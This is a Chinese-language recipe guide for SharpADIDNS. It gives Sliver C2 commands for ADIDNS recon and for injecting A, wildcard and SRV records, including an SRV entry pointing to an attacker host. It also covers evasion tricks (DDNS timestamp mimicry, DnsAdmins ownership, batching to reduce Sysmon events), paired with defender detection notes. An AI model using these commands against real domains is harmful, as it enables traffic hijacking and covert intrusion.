# Recipes

**语言**: [English](RECIPES.md) | **中文** | [Français](RECIPES.fr.md)

围绕 SharpADIDNS 的 lab 实验场景集。每个 recipe 从两个视角描述：

- **运维 / 实验视角** — 在受控的实验环境中如何复现某种 ADIDNS 写入或读取行为；
- **防御视角** — 蓝队 / SOC 侧能观察到什么，对应的告警、日志特征与监控盲点。

每个 recipe 自成一体 — 不用看其他几个就能直接跳到所需的那一个。默认使用 [`--c2` 模式](../README.zh-CN.md#通过-sliver-execute-assembly-使用) 作为调用形态，因为主部署路径之一是 Sliver `execute-assembly`。如要改在本地 shell 跑，去掉 `--c2`，把 `--password-base64` 换成 `--password`（并接受 cleartext 告警）。

## 全部 recipe 共用的变量

| 占位符 | 示例值 | 来源 |
| ----------- | ------------- | ------ |
| `$ZONE`     | `redteamnotes.local` | `list-zones` 的输出（recipe 1） |
| `$DN`       | `DC=redteamnotes,DC=local` | 你的 domain naming context |
| `$DC`       | `dc.redteamnotes.local` | PDC FQDN（用 `--show-pdc` 确认） |
| `$USER`     | `redteamnotes\redpen` | 调用方账户 |
| `$PWB64`    | `UmVkdGVhbU4wdDNzLg==` | `printf 'pwd' \| base64` |

按你自己的实验环境填值替换。

### Flag 语法快捷形式

两种 flag 形式都被接受：`--flag value`（空格分隔，本 recipe 集合主要用这种）和 `--flag=value`（等号形式）。等号形式在多层 shell 解析（Sliver `execute-assembly`、scripted ssh 等）中更稳定，尤其当值含空格、quote 或 `$` 时。混用也没问题：`--username=redteamnotes\u --password-base64 UmVk...` 可以工作。

按动词的子帮助同样可用：`SharpADIDNS.exe add --help` 只显示 `add` 相关的 flag；`enum --help` 只显示 enum 相关的子集；以此类推。全局 `--help`（不带 verb）打印完整参考。

---

## 1. ADIDNS 环境梳理

**运维 / 实验视角**：在写之前先摸清 ADIDNS 环境。盘点 zone、注意值得关注的主机名、所有者模式。只读 — 不写 AD，不留磁盘痕迹。

```bash
sliver > execute-assembly SharpADIDNS.exe -p dllhost.exe -- \
    --c2 \
    --username "$USER" --password-base64 "$PWB64" \
    --dn "$DN" --server "$DC" \
    --script "
        list-zones;
        enum --zone $ZONE --filter-type A,AAAA;
        enum --zone $ZONE --filter-name '_*._tcp.*';
        enum --zone $ZONE --only-tombstoned
    "
```

stdout 输出是 4 个 JSON 数组（每条语句一个）加一行 `script_summary`。在调用方那边用 `jq` 后处理：

```bash
# 调用方后处理
... | jq -c 'select(._type != "script_summary") | .nodes[] | {name, dn, records: [.records[].type]}'
```

重点看：

- 显而易见之外的自定义 zone（常见 `dev.redteamnotes.local`、`lab.redteamnotes.local`）
- 已存在的通配符 `*` 记录（已部署 → 别覆盖）
- `wpad` / `isatap` / `localhost`（legacy 或 honeypot 指示）
- SCCM / SQL / printer 主机名（高影响目标）
- 近期的 tombstoned 活动（运维清理或防护动作正在进行中）

**防御视角**：

- 整 zone 的 LDAP 枚举在 DC 上产生 4662（Directory Service Access），前提是 zone 容器的 SACL 配置生效。
- MDI 的 *Reconnaissance using DNS* 检测族对此类批量查询有特征匹配，但阈值偏宽 — 真实告警率取决于 baseline。
- 单纯的 `enum` 不产生 5136 / 5137 / 5141；蓝队只能在 LDAP query 流量上区分 reconnaissance 与正常运维查询。
- 监控建议：把对 `MicrosoftDNS`、`DomainDnsZones`、`ForestDnsZones` 三个 container 的非服务账户大体量 search 纳入异常基线。

---

## 2. 单记录写入 + 回滚保险

**运维 / 实验视角**：写入一条 A 记录（例如 SCCM 或 NTLM 实验场景中的指向配置），并在 receipt 中捕获写前状态以便回滚。

```bash
sliver > execute-assembly SharpADIDNS.exe -p dllhost.exe -- \
    add \
        --c2 \
        --username "$USER" --password-base64 "$PWB64" \
        --zone "$ZONE" --dn "$DN" --server "$DC" \
        --name sccm --type A --data 10.0.0.66
```

receipt 以一行 JSON 回来。在做任何其他事前先存下来：

```bash
... | tee /tmp/sccm-receipt.json | jq .
```

receipt 的 `reverse` 字段就是 create 场景的一行式撤销：

```json
{ "action":"add", "operation":"create",
  "reverse": "SharpADIDNS.exe remove --zone redteamnotes.local --name sccm --dn DC=redteamnotes,DC=local --yes",
  ... }
```

要清理时：

```bash
sliver > execute-assembly SharpADIDNS.exe -p dllhost.exe -- \
    remove \
        --c2 \
        --username "$USER" --password-base64 "$PWB64" \
        --zone $ZONE --dn $DN --server $DC \
        --name sccm
```

注意 `reverse` 故意省略了 `--username` / `--password*` — 自己补回 auth flag。

**防御视角**：

- 新 dnsNode 创建触发 5137 — `ObjectClass=dnsNode`，且 `ObjectName` 即新建节点的 RDN（`sccm`）。蓝队凭名字本身就能识别异常命名。
- 写入立即被 replicate；非 PDC 写入会在 `replPropertyMetaData` 中留下非 PDC DSA 痕迹。
- 后续 `remove` 触发 5141，事件流 `5137 → 5141` 短时间内出现是 "写入后立即回退" 模式 — 蓝队可作为 IoA pattern。
- Subject 字段不是特权账户（不在 `Domain Admins` / `DnsAdmins` / `Enterprise Admins`）时告警优先级应该提高。
- 监控建议：5137 with non-privileged subject + dnsNode RDN matching common 攻击关键词（`sccm` / `mssql` / `proxy` 等关键基础设施名）。

---

## 3. 低噪写入（mimic-aging + set-owner）

**运维 / 实验视角**：和 recipe 2 一样，但把生成的 `dnsRecord` blob 和对象 owner 调整得像一次常规 DDNS 写入，规避两个常见的取证指标。也用于研究 fingerprint 对蓝队检测覆盖的影响。

```bash
sliver > execute-assembly SharpADIDNS.exe -p dllhost.exe -- \
    add \
        --c2 \
        --username "$USER" --password-base64 "$PWB64" \
        --zone "$ZONE" --dn "$DN" --server "$DC" \
        --name sccm --type A --data 10.0.0.66 \
        --mimic-aging --set-owner "$ZONE\\DnsAdmins"
```

与 recipe 2 的差异：

| 字段 | Recipe 2（默认） | Recipe 3（低噪） |
| ----- | ------------------ | ------------------ |
| `dnsRecord.Timestamp`（offset 20） | `0`（static — IOC） | `hours-since-1601` of now（看起来像 DDNS 自然写入） |
| `dnsNode.nTSecurityDescriptor.Owner` | 你的 token 的 SID | `DnsAdmins`（privileged group，混在日常管理活动里不显眼） |

写完后验证：

```bash
sliver > execute-assembly SharpADIDNS.exe -p dllhost.exe -- \
    query \
        --c2 \
        --username "$USER" --password-base64 "$PWB64" \
        --zone "$ZONE" --dn "$DN" --server "$DC" \
        --name sccm
```

在 JSON receipt 中确认：

- `record.timestamp` 是个大数字（~3.7M+），不是 0
- `permissions.owner` 是 `<domain>\DnsAdmins`

**注意**：`--set-owner` 需要新节点上有 `WriteOwner` 权限。创建者通常对自己刚建的节点隐式有这个权限。如果 receipt 里 `set_owner.result` 是 `"error"`，说明你没这个权限；记录写入本身还是成功了。

**防御视角**：

- `mimic-aging` 让 `dnsRecord.Timestamp != 0`，规避了"`Timestamp=0` 静态记录在 dynamic-update zone"这个简单 IOC。但 `whenChanged` 仍记录真实写入时间；与 zone 内同类 host 的 DDNS update 周期对比仍能发现异常。
- `set-owner` 改 owner 后，5137 / 5136 事件的 `Subject` 字段仍记录**真实发起者**，不是新 owner。owner 字段只影响后续读 nTSecurityDescriptor 时的视图。
- `replPropertyMetaData` 上 originating DSA 字段不可伪造 — 写入来自哪台 DC、何时写的，仍有 ground truth。
- 监控建议：不要只盯 `Timestamp=0`；把 5137 `Subject` 与 dnsNode 的 final owner SID 做交叉比对，发现 "我是 Bob 但我建了 DnsAdmins 拥有的节点" 这种 mismatch。

---

## 4. 通配符 A 记录写入（zone 全覆盖测试）

**运维 / 实验视角**：在 zone 中写入通配符记录，让该 zone 内所有未解析的名称都解析到指定 IP。用于 ADIDNS 行为验证、resolver fallback 测试、或 lab 中的端到端 PoC。

**警告**：这是本工具能做的最高影响写操作。先跑 recipe 1 确认 zone 内没有合法的通配符存在。该记录会覆盖 zone 中**所有**未存在的主机名，直到被移除。`--c2` 已含 `--yes`，工具不会再提示 — 务必明确意图。

```bash
# 预检：通配符已经存在？
sliver > execute-assembly SharpADIDNS.exe -p dllhost.exe -- \
    enum \
        --c2 \
        --username "$USER" --password-base64 "$PWB64" \
        --zone "$ZONE" --dn "$DN" --server "$DC" \
        --filter-name '\*'

# 写入（仅当预检返回 0 个节点时）
sliver > execute-assembly SharpADIDNS.exe -p dllhost.exe -- \
    add \
        --c2 \
        --username "$USER" --password-base64 "$PWB64" \
        --zone "$ZONE" --dn "$DN" --server "$DC" \
        --name "*" --type A --data 10.0.0.66 --ttl 60 \
        --mimic-aging
```

`--ttl 60` 让记录在客户端缓存中短命 — 移除后清理在一分钟内传播完成。（默认 600s 也行，但 60 更适合 "in-and-out fast"。）

清理：

```bash
sliver > execute-assembly SharpADIDNS.exe -p dllhost.exe -- \
    remove \
        --c2 \
        --username "$USER" --password-base64 "$PWB64" \
        --zone $ZONE --dn $DN --server $DC \
        --name "*"
```

再跑一次 recipe 1 确认通配符已清。

**防御视角**：

- 5137 with `RDN='*'` 在 MDI / Sentinel / Splunk 几乎所有 ADIDNS 检测包里都是 **highest-priority** 告警。
- *Suspicious DNS record creation* (MDI) 对 wildcard 名字有专门规则，无须额外配置。
- GQBL 不阻挡 wildcard（它只屏蔽 `wpad` / `isatap`），所以 DNS 服务器照样应答 — DNS query 监控（passive DNS / DNS firewall）会看到大量未知 host 解析到同一 IP 这种 anomaly。
- TTL=60 比典型 zone TTL（通常 600+ 或 3600）短，本身就是异常特征 — 蓝队 baseline 偏离可被 SIEM rule 抓到。
- 监控建议：5137 with RDN matching `^[*]$` 或 `wpad|isatap|localhost` 直接转高优先级；同时关注 client-side DNS resolver 日志的"未知 host 突然有解析"事件。

---

## 5. SRV 记录追加（SRV 解析行为研究）

**运维 / 实验视角**：在已有 SRV 节点上追加一条 SRV，研究 Windows 客户端的 SRV 解析行为（priority / weight 选择、多目标共存时的处理等）。常用于 lab 环境中对 AD 服务定位机制的实验。

实验中常用的研究目标节点是 `_ldap._tcp.dc._msdcs.<zone>`（DC 在此处公告自己）。新写入的 SRV，参数 `priority 0 weight 100 port 389`，会与合法 DC 记录并存为 candidate — 客户端按其 SRV 选择算法处理。

```bash
sliver > execute-assembly SharpADIDNS.exe -p dllhost.exe -- \
    add \
        --c2 \
        --username "$USER" --password-base64 "$PWB64" \
        --zone "$ZONE" --dn "$DN" --server "$DC" \
        --name '_ldap._tcp.dc._msdcs' \
        --type SRV --srv-priority 0 --srv-weight 100 --srv-port 389 \
        --data attacker.$ZONE \
        --append --mimic-aging
```

`--append` 是这里的关键模式：合法 DC 的 SRV 记录保留；你的追加在旁。不用 `--append` 就得用 `--force`，那会覆盖真实 DC 的 SRV（在生产环境中基本可以确定是灾难性的）。

写后验证节点上所有 SRV：

```bash
sliver > execute-assembly SharpADIDNS.exe -p dllhost.exe -- \
    query \
        --c2 \
        --username "$USER" --password-base64 "$PWB64" \
        --zone "$ZONE" --dn "$DN" --server "$DC" \
        --name '_ldap._tcp.dc._msdcs'
```

清理时必须**只**移除你追加的那条，不动合法 DC 的 SRV。receipt 的 `previous_state.records_base64` 里有原始 SRV blob。要精确还原：

```bash
# 调用方：从保存的 receipt 中提取 previous_state.records_base64，
# 然后对节点上每个 b64 条目：

# 1) 整个节点先 disable（清空所有 SRV，置 tombstone）
sliver > execute-assembly ... disable --zone $ZONE --name '_ldap._tcp.dc._msdcs' --dn $DN

# 2) 通过 --raw 重新追加每条原始 SRV blob
sliver > execute-assembly ... add --zone $ZONE --name '_ldap._tcp.dc._msdcs' \
    --raw <previous_state.records_base64[0]> --force --dn $DN
sliver > execute-assembly ... add --zone $ZONE --name '_ldap._tcp.dc._msdcs' \
    --raw <previous_state.records_base64[1]> --append --dn $DN
# ... 对剩余每条原始记录重复
```

这里多步是有意的；工具的 `reverse` 字段对 `add --append` 场景为 `null`，因为没有单条命令能撤销它。

**防御视角**：

- `_msdcs` 子树下出现新 dnsNode 或 dnsRecord 修改几乎总是异常 — 合法 DC SRV 由 netlogon service 自动维护，不应有人工写入。
- 5136 on dnsRecord under `_*._tcp.*._msdcs.*` 是 MDI 高置信度告警特征；建议蓝队在 SIEM 单独建 saved search。
- 客户端 DC locator 行为变化在 Windows 上有 ETW 痕迹（DC Locator）— 与 SRV 写入时间戳对比可证实因果。
- `replPropertyMetaData` 上 `dnsRecord` 的 `version` 字段每次写入 +1 — 突增是写入频繁的间接证据。
- 监控建议：把 5136 with `AttributeLDAPDisplayName=dnsRecord` 且 ObjectDN 含 `_msdcs` 设为最高优先级，无论 Subject 是谁。

---

## 6. `--script` 批处理（一次 execute-assembly 跑多个动作）

**运维 / 实验视角**：把一个 3 步操作（pre-check → 修改 → post-check）在单次 `execute-assembly` 调用内完成，使其只产生**一次** Sysmon EID 1 而不是三次。也用于评估 N 个动作 vs 1 个进程对 EDR / SOC 调查面的差异。

```bash
sliver > execute-assembly SharpADIDNS.exe -p dllhost.exe -- \
    --c2 \
    --username "$USER" --password-base64 "$PWB64" \
    --zone "$ZONE" --dn "$DN" --server "$DC" \
    --script "
        enum --filter-name 'sccm*';
        add --name sccm --type A --data 10.0.0.66 --mimic-aging --set-owner '$ZONE\\\\DnsAdmins';
        query --name sccm
    "
```

注意 `--set-owner` 里的双反斜杠 `\\\\`：Sliver 命令解析器吃掉一对，C# 参数解析器吃掉第二对，工具最终看到的字符串是 `$ZONE\DnsAdmins`。**在你具体的 Sliver 环境里务必先用 `--dry-run` script 试一遍 escape 层级**。

stdout 输出：3 条 receipt（每语句一个） + 1 行 `script_summary`。在调用方那边 pipe 给 `jq -c .`；每行是独立有效的 JSON，且四行共享同一个 `correlation_id`，下游收集器可以用 `jq -s 'group_by(.correlation_id)'` 分组。

`--script-on-error halt`（默认）首个失败即停。"best-effort 批处理" 用 `--script-on-error continue`（或短别名 `--continue-on-error`），再看 summary 里的 `failed` 计数。

**防御视角**：

- `--script` 不减少 DC 侧事件 — N 个 action 仍各自产生对应的 5136 / 5137 / 5141。少的是 endpoint side 的 process spawn 数。
- 蓝队若只看 DC 审计，看不出"批量 vs 单次"差别；要看 endpoint EDR（process tree、CLR 加载、网络外联）才有区别。
- CLR 加载的 ETW provider `Microsoft-Windows-DotNETRuntime` 在 .NET reflection 加载时有特征事件 — 配合 process create 可识别 execute-assembly pattern。
- `correlation_id` 是工具内部 ID，DC 日志里不存在 — 蓝队若要把多个 action 关联回单次 invocation，必须用 endpoint side 数据（process PID + timestamp window）。
- 监控建议：endpoint 侧 ETW + `Image=svchost.exe`/`dllhost.exe`/`RuntimeBroker.exe` + LDAP outbound traffic 同时出现是 execute-assembly 的强特征。

---

## 7. 用备份文件做环境恢复

**运维 / 实验视角**：仅靠你一路累积的 JSONL 备份文件，回滚本次实验期间的所有写入。

实验过程中你一直在带 `--backup-to ops.jsonl`（真实路径，不是 `-`），所以每次写都把 `previous_state` 落到你控制的主机上的一个文件。现在要回滚。

```bash
# 调用方处理：ops.jsonl 中每行是一个节点的自包含备份条目。
# 倒序处理（最新优先）：

tac ops.jsonl | while IFS= read -r entry; do
    dn=$(jq -r .dn <<<"$entry")
    name=$(jq -r '.dn | split(",")[0] | sub("^DC="; "")' <<<"$entry")
    zone=$(jq -r '.dn | split(",")[1] | sub("^DC="; "")' <<<"$entry")  # 按你的 zone DN 调整
    records=$(jq -c '.records' <<<"$entry")
    tombstoned=$(jq -r .dNSTombstoned <<<"$entry")

    if [ "$records" = "[]" ] && [ "$tombstoned" = "false" ]; then
        # 节点在我们改之前不存在 → 现在 remove
        sliver > execute-assembly ... remove --zone "$zone" --name "$name" ...
    else
        # 节点已存在 → disable 清掉我们的写入，再逐条 re-add 原始记录
        sliver > execute-assembly ... disable --zone "$zone" --name "$name" ...
        jq -r '.records[]' <<<"$entry" | while read -r blob; do
            sliver > execute-assembly ... add --raw "$blob" --force --zone "$zone" --name "$name" ...
        done
    fi
done
```

先对一条目用 `--dry-run` 附加到每个 `execute-assembly` 后测试这个循环。OK 后再真跑。

如果想完全在内存里，不让 `ops.jsonl` 落盘 — 那就改成在 C2 那边保存每次写入的 receipt。同样的逻辑，换个数据源。

**防御视角**：

- 回滚本身也产生 5136 / 5137 / 5141 — rollback 在 DC 看来就是更多的写操作，并不"撤销审计痕迹"。
- 短时间内出现 `add → disable → add --raw` 这种循环序列是异常 pattern（合法 DDNS 不这样工作）；蓝队可设计 sequence-based detection。
- 如果蓝队拿到 endpoint 上的 `ops.jsonl` 文件，那是**完整 forensic trail** — 含所有 DN、时间戳、原始 records_base64，比 DC 审计还细粒度。
- `--backup-to -`（写 stdout 不落盘）回滚必须靠 receipt 流 — 蓝队拿 endpoint 抓不到这个 trail，但可以从 C2 channel 捕获回流数据中重建（如果有 TLS interception）。
- 监控建议：DC 侧关注短时间内同一 dnsNode 反复 5136 / 5137 / 5141 的 host；endpoint 侧关注 .jsonl 文件创建在非典型路径（如 `C:\Windows\System32\` 下的 .jsonl）。

---

## 8. 写前权限自检（DACL 检查）

**运维 / 实验视角**：在尝试 `--force` replace 或 `remove` 之前，确认你对目标节点有写权限 — 不实际写入。也用于研究 DACL 读 vs 写在审计上的差异。

```bash
sliver > execute-assembly SharpADIDNS.exe -p dllhost.exe -- \
    query \
        --c2 \
        --username "$USER" --password-base64 "$PWB64" \
        --zone "$ZONE" --dn "$DN" --server "$DC" \
        --name fileserver \
        -v
```

`-v`（verbose）也会 dump 继承的 ACE。在 receipt 的 `permissions.aces[]` 里找：

- `trustee` 包含你的 user / 你所在的组 / `Authenticated Users` 的条目
- `type: "Allow"`（不是 Deny）
- `rights` 含 `WriteProperty`、`WriteDacl` 或 `GenericAll`

如果一条都没匹配 → 调用方没权限 → 别尝试写，省一条审计事件。

如果唯一匹配的 ACE 是 `Authenticated Users` 在 zone container 上有 `CreateChild`（不在节点本身上），你可以建 *新* 节点但改不了已有的 — 这影响 `--append` 语义。

**防御视角**：

- LDAP DACL 读触发 4662 with `Access Mask = 0x20`（Read Property）或 `0x80`（Read Control），不是 write mask。
- 4662 的告警价值通常很低（合法管理工具频繁读 DACL），但密集查询多个高价值 dnsNode 的 DACL 是 *reconnaissance* 特征。
- 实际 5136 / 5137 缺席仅表明调用方克制 — 不意味着没试图侦察。蓝队需要看 4662 的 frequency 和 target spread，不是单事件。
- MDI 把 nTSecurityDescriptor 的密集查询纳入 LDAP reconnaissance 检测族，但触发阈值偏宽。
- 监控建议：单一非特权 subject 在短时间内查询多个 dnsNode 的 nTSecurityDescriptor → 设为 reconnaissance 候选；不必单事件告警，做 frequency baseline。

---

## 横向提示

下面这些适用于每个 recipe，不是只对某一个：

- **任何在新环境从没做过的写操作，先 `--dry-run`**。dry-run 也会 bind（所以会有读类审计），但不写入。
- **写之前一定要有恢复计划**。要么 `--backup-to file`（落盘）、要么 `--backup-to -`（receipt 内嵌、ephemeral）、要么手动从 receipt 抓 `previous_state`。
- **`--c2` 含 `--yes`** — 没有人工提示。工具不会替你拦下 wildcard、`wpad`/`isatap`、un-tombstone 或 hard-remove。务必明确意图。
- **DC 侧审计（5136 / 5137 / 5141）和 Defender for Identity 传感器与 `--c2` 无关，照常触发**。工具优化的是调用方侧痕迹；工具里没有任何东西能藏住 DC 的审计日志。
- **`reverse` 字段是 best-effort 单行式**。replace / append / disable / remove 场景下 `reverse` 为 `null`，你必须从 `previous_state.records_base64` 重建。别只靠 `reverse` — 保留完整 receipt。
- **防御视角的可见性是底线**：本文档的 "防御视角" 段落不是穷举 — 真实 SOC 部署里还有 endpoint EDR、network DPI、DNS query log、AD replication metadata 等多种数据源；任何 ADIDNS 操作都应假定**至少有一种数据源能看到**。

完整的审计可见性模型参见主 README 的 [`审计可见性`](../README.zh-CN.md#审计可见性) 章节。
